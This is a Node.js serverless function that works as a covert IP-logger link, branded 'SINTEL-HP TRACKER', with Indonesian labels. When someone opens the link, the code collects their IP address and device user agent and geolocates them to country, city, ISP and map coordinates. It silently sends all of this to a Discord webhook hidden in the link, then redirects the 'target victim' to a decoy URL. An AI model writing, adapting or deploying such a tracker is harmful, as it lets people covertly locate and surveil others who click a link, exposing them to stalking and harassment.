const axios = require('axios');

module.exports = async (req, res) => {
    // Parameter parsing
    // w = base64 encoded discord webhook
    // t = base64 encoded target url to redirect to
    const { w, t } = req.query;

    let targetUrl = 'https://google.com';
    if (t) {
        try { targetUrl = Buffer.from(t, 'base64').toString('utf-8'); } catch (e) { }
    }

    if (!w) {
        // If no webhook, just redirect
        return res.redirect(301, targetUrl);
    }

    let webhookUrl;
    try {
        webhookUrl = Buffer.from(w, 'base64').toString('utf-8');
    } catch (e) {
        return res.redirect(301, targetUrl);
    }

    // Gather Target Data
    const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';

    // Get Geo Location using ip-api.com
    let geo = {};
    try {
        // Just extract first IP if multiple
        const cleanIp = ip.split(',')[0].trim();
        const geoReq = await axios.get(`http://ip-api.com/json/${cleanIp}`);
        geo = geoReq.data;
    } catch (e) {
        // Silent fail
    }

    // Build Discord Embed Tracker Payload
    const payload = {
        username: "SINTEL-HP TRACKER",
        avatar_url: "https://i.imgur.com/4M34hiw.png",
        embeds: [{
            title: "🚨 TARGET TERDETEKSI (IP LOGGER) 🚨",
            color: 16711680,
            fields: [
                { name: "📡 IP Address", value: `\`${ip}\``, inline: true },
                { name: "🌍 Negara", value: geo.country || 'Unknown', inline: true },
                { name: "🏙️ Kota/Region", value: `${geo.city || 'Unknown'}, ${geo.regionName || 'Unknown'}`, inline: true },
                { name: "🏢 ISP / Provider", value: geo.isp || geo.org || 'Unknown', inline: false },
                { name: "📍 Kordinat / Maps", value: geo.lat ? `[Klik untuk lihat di Google Maps](https://www.google.com/maps?q=${geo.lat},${geo.lon})` : 'Unknown', inline: false },
                { name: "🖥️ User Agent (Perangkat)", value: `\`\`\`${userAgent}\`\`\``, inline: false }
            ],
            footer: { text: "SINTEL-HP | Real-time Target Logger" },
            timestamp: new Date().toISOString()
        }]
    };

    // Send silently to discord
    try {
        await axios.post(webhookUrl, payload);
    } catch (err) {
        // silent
    }

    // End request and redirect the target victim
    return res.redirect(301, targetUrl);
};
